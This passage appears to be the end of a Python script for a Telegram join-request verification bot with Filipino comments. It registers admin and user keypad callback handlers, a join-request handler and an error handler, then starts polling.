    application.add_handler(CallbackQueryHandler(verifier.handle_admin_callback, pattern=r'^(setup_code_|view_pending|approve_user_|reject_user_|refresh_stats)'))
    application.add_handler(CallbackQueryHandler(verifier.handle_user_callback, pattern=r'^(num_|backspace_|submit_code_)'))
    
    # I-add ang join request handler
    application.add_handler(ChatJoinRequestHandler(verifier.handle_join_request))
    
    # I-add ang text message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verifier.handle_text_message))
    
    # I-add ang error handler
    application.add_error_handler(verifier.error_handler)
    
    # I-log ang bot startup
    logger.info("Filipino Verifier Bot nagsimula na...")
    logger.info(f"Admin ID: {ADMIN_ID}")
    logger.info(f"Channel ID: {CHANNEL_ID}")
    
    # I-start ang bot
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
